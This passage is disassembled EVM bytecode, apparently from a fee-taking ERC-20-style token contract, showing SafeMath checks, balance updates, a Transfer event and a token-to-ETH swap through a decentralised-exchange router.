PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x2041 PUSH1 0x2 DUP5 PUSH2 0x2527 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x206C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x6 SLOAD DUP3 GT ISZERO PUSH2 0x20B7 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x20AE SWAP1 PUSH2 0x3594 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x20C1 PUSH2 0x2571 JUMP JUMPDEST SWAP1 POP PUSH2 0x20D6 DUP2 DUP5 PUSH2 0x2527 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP2 POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x14 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x2 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x2115 JUMPI PUSH2 0x2114 PUSH2 0x35B4 JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x20 MUL PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x2143 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x20 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP ADDRESS DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x215B JUMPI PUSH2 0x215A PUSH2 0x3324 JUMP JUMPDEST JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD SWAP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP PUSH1 0x11 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xAD5C4648 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x2202 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2226 SWAP2 SWAP1 PUSH2 0x35F8 JUMP JUMPDEST DUP2 PUSH1 0x1 DUP2 MLOAD DUP2 LT PUSH2 0x223A JUMPI PUSH2 0x2239 PUSH2 0x3324 JUMP JUMPDEST JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD SWAP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP PUSH2 0x22A8 PUSH2 0x227F PUSH2 0xED1 JUMP JUMPDEST PUSH1 0x11 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH2 0x17D1 JUMP JUMPDEST PUSH1 0x11 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x791AC947 DUP4 PUSH1 0x0 DUP5 ADDRESS TIMESTAMP PUSH1 0x40 MLOAD DUP7 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x230C SWAP6 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x371E JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2326 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x233A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 PUSH1 0x14 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH2 0x236E DUP8 PUSH2 0x259C JUMP JUMPDEST SWAP6 POP SWAP6 POP SWAP6 POP SWAP6 POP SWAP6 POP SWAP6 POP PUSH2 0x23CC DUP7 PUSH1 0x2 PUSH1 0x0 DUP13 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x2604 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 DUP12 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0x2461 DUP6 PUSH1 0x2 PUSH1 0x0 DUP12 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x264E SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 DUP11 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0x24AD DUP2 PUSH2 0x26AC JUMP JUMPDEST PUSH2 0x24B7 DUP5 DUP4 PUSH2 0x2769 JUMP JUMPDEST DUP8 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP6 PUSH1 0x40 MLOAD PUSH2 0x2514 SWAP2 SWAP1 PUSH2 0x2C56 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2569 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1A DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A206469766973696F6E206279207A65726F000000000000 DUP2 MSTORE POP PUSH2 0x27A3 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH2 0x257E PUSH2 0x2806 JUMP JUMPDEST SWAP2 POP SWAP2 POP PUSH2 0x2595 DUP2 DUP4 PUSH2 0x2527 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP3 POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x0 PUSH2 0x25B9 DUP11 PUSH1 0xC SLOAD PUSH1 0xD SLOAD PUSH2 0x2865 JUMP JUMPDEST SWAP3 POP SWAP3 POP SWAP3 POP PUSH1 0x0 PUSH2 0x25C9 PUSH2 0x2571 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH2 0x25DC DUP15 DUP8 DUP8 DUP8 PUSH2 0x28FB JUMP JUMPDEST SWAP3 POP SWAP3 POP SWAP3 POP DUP3 DUP3 DUP3 DUP10 DUP10 DUP10 SWAP13 POP SWAP13 POP SWAP13 POP SWAP13 POP SWAP13 POP SWAP13 POP POP POP POP POP POP POP POP SWAP2 SWAP4 SWAP6 POP SWAP2 SWAP4 SWAP6 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2646 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1E DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A207375627472616374696F6E206F766572666C6F770000 DUP2 MSTORE POP PUSH2 0x1F01 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 PUSH2 0x265D SWAP2 SWAP1 PUSH2 0x3778 JUMP JUMPDEST SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x26A2 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2699 SWAP1 PUSH2 0x381A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x26B6 PUSH2 0x2571 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x26CD DUP3 DUP5 PUSH2 0x2984 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH2 0x2721 DUP2 PUSH1 0x2 PUSH1 0x0 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x264E SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP POP POP JUMP JUMPDEST PUSH2 0x277E DUP3 PUSH1 0x6 SLOAD PUSH2 0x2604 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x6 DUP2 SWAP1 SSTORE POP PUSH2 0x2799 DUP2 PUSH1 0x7 SLOAD PUSH2 0x264E SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x7 DUP2 SWAP1 SSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP4 GT DUP3 SWAP1 PUSH2 0x27EA JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x27E1 SWAP2 SWAP1 PUSH2 0x2A97 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 PUSH2 0x27F9 SWAP2 SWAP1 PUSH2 0x3869 JUMP JUMPDEST SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x6 SLOAD SWAP1 POP PUSH1 0x0 PUSH8 0xDE0B6B3A7640000 SWAP1 POP PUSH2 0x283A PUSH8 0xDE0B6B3A7640000 PUSH1 0x6 SLOAD PUSH2 0x2527 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST DUP3 LT ISZERO PUSH2 0x2858 JUMPI PUSH1 0x6 SLOAD PUSH8 0xDE0B6B3A7640000 SWAP4 POP SWAP4 POP POP POP PUSH2 0x2861 JUMP JUMPDEST DUP2 DUP2 SWAP4 POP SWAP4 POP POP POP JUMPDEST SWAP1 SWAP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH2 0x2891 PUSH1 0x64 PUSH2 0x2883 DUP9 DUP11 PUSH2 0x2984 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x2527 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x28BB PUSH1 0x64 PUSH2 0x28AD DUP9 DUP12 PUSH2 0x2984 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x2527 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x28E4 DUP3 PUSH2 0x28D6 DUP6 DUP13 PUSH2 0x2604 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x2604 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP DUP1 DUP4 DUP4 SWAP6 POP SWAP6 POP SWAP6 POP POP POP POP SWAP4 POP SWAP4 POP SWAP4 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH2 0x2914 DUP6 DUP10 PUSH2 0x2984 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x292B DUP7 DUP10 PUSH2 0x2984 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x2942 DUP8 DUP10 PUSH2 0x2984 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x296B DUP3 PUSH2 0x295D DUP6 DUP8 PUSH2 0x2604 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x2604 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP DUP4 DUP2 DUP5 SWAP7 POP SWAP7 POP SWAP7 POP POP POP POP POP SWAP5 POP SWAP5 POP SWAP5 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP4 SUB PUSH2 0x2996 JUMPI PUSH1 0x0 SWAP1 POP PUSH2 0x29F8 JUMP JUMPDEST PUSH1 0x0 DUP3 DUP5 PUSH2 0x29A4 SWAP2 SWAP1 PUSH2 0x389A JUMP JUMPDEST SWAP1 POP DUP3 DUP5 DUP3 PUSH2 0x29B3 SWAP2 SWAP1 PUSH2 0x3869 JUMP JUMPDEST EQ PUSH2 0x29F3 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x29EA SWAP1 PUSH2 0x3966 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2A38 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x2A1D JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x2A47 JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2A69 DUP3 PUSH2 0x29FE JUMP JUMPDEST PUSH2 0x2A73 DUP2 DUP6 PUSH2 0x2A09 JUMP JUMPDEST SWAP4 POP PUSH2 0x2A83 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x2A1A JUMP JUMPDEST PUSH2 0x2A8C DUP2 PUSH2 0x2A4D JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x2AB1 DUP2 DUP5 PUSH2 0x2A5E JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2AEE DUP3 PUSH2 0x2AC3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2AFE DUP2 PUSH2 0x2AE3 JUMP JUMPDEST DUP2 EQ PUSH2 0x2B09 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2B1B DUP2 PUSH2 0x2AF5 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2B34 DUP2 PUSH2 0x2B21 JUMP JUMPDEST DUP2 EQ PUSH2 0x2B3F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2B51 DUP2 PUSH2 0x2B2B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x2B6E JUMPI PUSH2 0x2B6D PUSH2 0x2AB9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2B7C DUP6 DUP3 DUP7 ADD PUSH2 0x2B0C JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x2B8D DUP6 DUP3 DUP7 ADD PUSH2 0x2B42 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2BAC DUP2 PUSH2 0x2B97 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2BC7 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2BA3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2BF2 PUSH2 0x2BED PUSH2 0x2BE8 DUP5 PUSH2 0x2AC3 JUMP JUMPDEST PUSH2 0x2BCD JUMP JUMPDEST PUSH2 0x2AC3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2C04 DUP3 PUSH2 0x2BD7 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2C16 DUP3 PUSH2 0x2BF9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2C26 DUP2 PUSH2 0x2C0B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2C41 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2C1D JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2C50 DUP2 PUSH2 0x2B21 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2C6B PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2C47 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x2C8A JUMPI PUSH2 0x2C89 PUSH2 0x2AB9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2C98 DUP7 DUP3 DUP8 ADD PUSH2 0x2B0C JUMP JUMPDEST SWAP4 POP POP PUSH1 0x20 PUSH2 0x2CA9 DUP7 DUP3 DUP8 ADD PUSH2 0x2B0C JUMP JUMPDEST SWAP3 POP POP PUSH1 0x40 PUSH2 0x2CBA DUP7 DUP3 DUP8 ADD PUSH2 0x2B42 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2CDA DUP2 PUSH2 0x2CC4 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2CF5 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2CD1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2D04 DUP2 PUSH2 0x2AE3 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2D1F PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2CFB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2D30 DUP3 PUSH2 0x2BF9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2D40 DUP2 PUSH2 0x2D25 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2D5B PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2D37 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2D6A DUP2 PUSH2 0x2B97 JUMP JUMPDEST DUP2 EQ PUSH2 0x2D75 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2D87 DUP2 PUSH2 0x2D61 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2DA3 JUMPI PUSH2 0x2DA2 PUSH2 0x2AB9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2DB1 DUP5 DUP3 DUP6 ADD PUSH2 0x2D78 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2DD0 JUMPI PUSH2 0x2DCF PUSH2 0x2AB9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2DDE DUP5 DUP3 DUP6 ADD PUSH2 0x2B0C JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2DF2 DUP3 PUSH2 0x2AC3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2E02 DUP2 PUSH2 0x2DE7 JUMP JUMPDEST DUP2 EQ PUSH2 0x2E0D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2E1F DUP2 PUSH2 0x2DF9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2E3B JUMPI PUSH2 0x2E3A PUSH2 0x2AB9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2E49 DUP5 DUP3 DUP6 ADD PUSH2 0x2E10 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x80 DUP6 DUP8 SUB SLT ISZERO PUSH2 0x2E6C JUMPI PUSH2 0x2E6B PUSH2 0x2AB9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2E7A DUP8 DUP3 DUP9 ADD PUSH2 0x2B42 JUMP JUMPDEST SWAP5 POP POP PUSH1 0x20 PUSH2 0x2E8B DUP8 DUP3 DUP9 ADD PUSH2 0x2B42 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x40 PUSH2 0x2E9C DUP8 DUP3 DUP9 ADD PUSH2 0x2B42 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x60 PUSH2 0x2EAD DUP8 DUP3 DUP9 ADD PUSH2 0x2B42 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP6 SWAP2 SWAP5 POP SWAP3 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 DUP4 PUSH1 0x1F DUP5 ADD SLT PUSH2 0x2EDE JUMPI PUSH2 0x2EDD PUSH2 0x2EB9 JUMP JUMPDEST JUMPDEST DUP3 CALLDATALOAD SWAP1 POP PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x2EFB 